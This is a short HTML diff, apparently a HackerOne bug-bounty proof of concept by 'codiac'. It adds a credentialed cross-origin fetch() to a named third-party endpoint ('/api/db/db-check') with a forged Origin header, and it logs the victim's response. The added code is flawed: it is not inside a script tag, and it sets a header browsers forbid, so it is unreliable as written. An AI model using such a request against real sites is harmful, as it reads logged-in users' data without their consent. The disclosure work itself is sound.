@@ -8,5 +8,14 @@
 </head>
 <body>
     <h1>POC by codiac H1 profile: https://hackerone.com/codiac</h1>
+    fetch("https://ai-answers.cdssandbox.xyz/api/db/db-check", {
+     method: "GET",
+    headers: {
+    'Origin': 'C0d1ac.github.io',
+  },
+     credentials: "include"
+   })
+   .then(response => response.json())
+   .then(data => console.log(data));
 </body>
 </html>
